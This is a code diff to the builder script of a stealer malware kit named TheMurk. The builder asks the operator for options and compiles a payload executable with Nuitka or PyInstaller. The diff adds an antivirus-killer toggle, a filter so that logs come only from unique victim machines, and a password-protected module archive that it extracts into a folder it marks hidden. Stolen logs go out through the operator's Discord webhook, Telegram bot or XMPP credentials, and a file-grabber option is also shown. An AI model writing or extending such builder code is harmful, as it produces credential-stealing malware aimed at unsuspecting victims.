@@ -65,6 +65,18 @@ class Builder():
         while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
             self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+        self.oneStart = ""
+        while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
+            self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+        self.avKiller = ""
+        while self.avKiller != "Y" and self.avKiller != "N" and self.avKiller != "n" and self.avKiller != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
+            self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+        self.builder = ""
+        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
+            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
@@ -101,6 +113,18 @@ class Builder():
         while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
             self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+        self.oneStart = ""
+        while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
+            self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+        self.avKiller = ""
+        while self.avKiller != "Y" and self.avKiller != "N" and self.avKiller != "n" and self.avKiller != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
+            self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+        self.builder = ""
+        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
+            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
@@ -137,6 +161,18 @@ class Builder():
         while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
             self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+        self.oneStart = ""
+        while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
+            self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+        self.avKiller = ""
+        while self.avKiller != "Y" and self.avKiller != "N" and self.avKiller != "n" and self.avKiller != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
+            self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+        self.builder = ""
+        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
+            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
@@ -168,7 +204,7 @@ class Builder():
         print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
         with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
-            extracted_zip.extractall(pwd=str.encode('pass'))
+            extracted_zip.extractall(pwd=str.encode('pwd'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
         
@@ -176,7 +212,13 @@ class Builder():
             data = f.read()
 
         if FG == "Y" or FG == "y":
-            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
+            data = data.replace('enableFileGrubber = False #enable file grabber', 'enableFileGrubber = True')
+
+        if self.avKiller == "Y" or self.avKiller == "y":
+            data = data.replace('avKiller = False #enable antiviruses killer', 'avKiller = True')
+
+        if self.oneStart == "Y" or self.oneStart == "y":
+            data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
         
         data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
         data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{jabberid}","{jabberpassword}","{jabberreceiver}"]')
@@ -188,14 +230,22 @@ class Builder():
         fullPath = os.path.abspath('Modules.zip')
         fullPath = fullPath.replace('\\Modules.zip', '')
         os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
-        os.system('start Compile.bat')
-        while os.path.exists("TheMurk.exe") == 0:
-            pass
-        if os.path.exists("TheMurk.exe") == 1:
-                    time.sleep(180)
-                    os.chdir(f'{fullPath}')
-                    shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
-
+        if self.builder == "Nuitka":
+            os.system('start CompileNuitka.bat')
+            while os.path.exists("TheMurk.exe") == 0:
+                pass
+            if os.path.exists("TheMurk.exe") == 1:
+                        time.sleep(180)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
+        elif self.builder == "Pyinstaller":
+            os.system('start CompilePyinstaller.bat')
+            while os.path.exists("dist/TheMurk.exe") == 0:
+                pass
+            if os.path.exists("dist/TheMurk.exe") == 1:
+                        time.sleep(5)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
         shutil.rmtree(r'buildingCache', ignore_errors=True)
         print("\033[33m{}\033[0m".format("(i) done"))
         input("\033[33m{}\033[0m".format("(i) exit on enter..."))
@@ -205,7 +255,7 @@ class Builder():
         print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
         with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
-            extracted_zip.extractall(pwd=str.encode('pass'))
+            extracted_zip.extractall(pwd=str.encode('pwd'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
 
@@ -213,7 +263,13 @@ class Builder():
             data = f.read()
 
         if FG == "Y" or FG == "y":
-            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
+            data = data.replace('enableFileGrubber = False #enable file grabber', 'enableFileGrubber = True')
+
+        if self.avKiller == "Y" or self.avKiller == "y":
+            data = data.replace('avKiller = False #enable antiviruses killer', 'avKiller = True')
+
+        if self.oneStart == "Y" or self.oneStart == "y":
+            data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
         
         data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 0")
         data = data.replace('discordData = ["url of your WebHook","name of that WebHook"]',f'discordData = ["{urlWebHook}","{name}"]')
@@ -224,14 +280,22 @@ class Builder():
         fullPath = os.path.abspath('Modules.zip')
         fullPath = fullPath.replace('\\Modules.zip', '')
         os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
-        os.system('start Compile.bat')
-        while os.path.exists("TheMurk.exe") == 0:
-            pass
-        if os.path.exists("TheMurk.exe") == 1:
-                    time.sleep(180)
-                    os.chdir(f'{fullPath}')
-                    shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
-
+        if self.builder == "Nuitka":
+            os.system('start CompileNuitka.bat')
+            while os.path.exists("TheMurk.exe") == 0:
+                pass
+            if os.path.exists("TheMurk.exe") == 1:
+                        time.sleep(180)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
+        elif self.builder == "Pyinstaller":
+            os.system('start CompilePyinstaller.bat')
+            while os.path.exists("dist/TheMurk.exe") == 0:
+                pass
+            if os.path.exists("dist/TheMurk.exe") == 1:
+                        time.sleep(5)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
         shutil.rmtree(r'buildingCache', ignore_errors=True)
         print("\033[33m{}\033[0m".format("(i) done"))
         input("\033[33m{}\033[0m".format("(i) exit on enter..."))
@@ -241,7 +305,7 @@ class Builder():
         print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
         with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
-            extracted_zip.extractall(pwd=str.encode('pass'))
+            extracted_zip.extractall(pwd=str.encode('pwd'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
 
@@ -249,7 +313,13 @@ class Builder():
             data = f.read()
 
         if FG == "Y" or FG == "y":
-            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
+            data = data.replace('enableFileGrubber = False #enable file grabber', 'enableFileGrubber = True')
+
+        if self.avKiller == "Y" or self.avKiller == "y":
+            data = data.replace('avKiller = False #enable antiviruses killer', 'avKiller = True')
+
+        if self.oneStart == "Y" or self.oneStart == "y":
+            data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
         
         data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 1")
         data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{token}","{id}"]')
@@ -261,14 +331,22 @@ class Builder():
         fullPath = os.path.abspath('Modules.zip')
         fullPath = fullPath.replace('\\Modules.zip', '')
         os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
-        os.system('start Compile.bat')
-        while os.path.exists("TheMurk.exe") == 0:
-            pass
-        if os.path.exists("TheMurk.exe") == 1:
-                    time.sleep(180)
-                    os.chdir(f'{fullPath}')
-                    shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
-
+        if self.builder == "Nuitka":
+            os.system('start CompileNuitka.bat')
+            while os.path.exists("TheMurk.exe") == 0:
+                pass
+            if os.path.exists("TheMurk.exe") == 1:
+                        time.sleep(180)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
+        elif self.builder == "Pyinstaller":
+            os.system('start CompilePyinstaller.bat')
+            while os.path.exists("dist/TheMurk.exe") == 0:
+                pass
+            if os.path.exists("dist/TheMurk.exe") == 1:
+                        time.sleep(5)
+                        os.chdir(f'{fullPath}')
+                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
         shutil.rmtree(r'buildingCache', ignore_errors=True)
         print("\033[33m{}\033[0m".format("(i) done"))
         input("\033[33m{}\033[0m".format("(i) exit on enter..."))
